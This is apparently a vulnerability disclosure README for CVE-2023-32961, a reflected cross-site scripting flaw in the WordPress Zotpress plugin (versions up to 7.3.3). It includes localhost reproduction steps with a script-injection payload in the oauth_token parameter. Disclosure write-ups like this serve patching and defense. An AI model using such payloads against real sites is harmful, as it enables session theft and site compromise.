# CVE-2023-32961

This repository is about XSS vulnerability in Wordpress Zotpress Plugin.

## Component details

---

### Component name

Zotpress

### Vulnerable version

≤ 7.3.3

### Component slug

zotpress

### Component link

https://wordpress.org/plugins/zotpress/

## Pre-requisite

---

Unauthenticated

## Vulenerability details

---

### Short description

`get_request_token` function in `zotpress/lib/admin/admin.accounts.oauth.php` is vulnerable to a XSS attack.

### How to reproduce (PoC)

1. Install the oauth php extension to trigger the vulnerability. (This is Zotpress's optional)
2. Login to [zotero.org](http://zotero.org/)
3. Conditions must be met for the `get_request_token` function to execute. (first time only)
Send a payload like this: `http://localhost:8080/wp-content/plugins/zotpress/lib/admin/admin.accounts.oauth.php?return_uri=http://localhost:8080&oauth_token=1`
4. Send a below payload
`http://localhost:8080/wp-content/plugins/zotpress/lib/admin/admin.accounts.oauth.php?return_uri=http://localhost:8080&oauth_token="><script>alert(1)</script>`

### Additional information

- You need a [zotero.org](http://zotero.org/) account.
- You need to set the oauthState value to 1 to trigger it. If the above payload doesn't work, you need to find a way to set oauthState to 1.
    - conditional expression :
        
        ```php
        $_GET['oauth_token'] != $state['request_token_info']['oauth_token']
        ```
        
- Easy to install php oauth extension:
    - One Line Command :
        
        ```bash
        sudo su; apt-get update; apt-get -y install gcc make autoconf libc-dev pkg-config libpcre3-dev; pecl install oauth; bash -c "echo extension=oauth.so > $PHP_INI_DIR/conf.d/oauth.ini"; service apache2 restart
        ```
        
- Tested in wordpress:latest Docker image.

### PoC Video

https://www.youtube.com/watch?v=5kZ7bNbs_-Q

## References

---

[CVE-2023-32961](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32961)
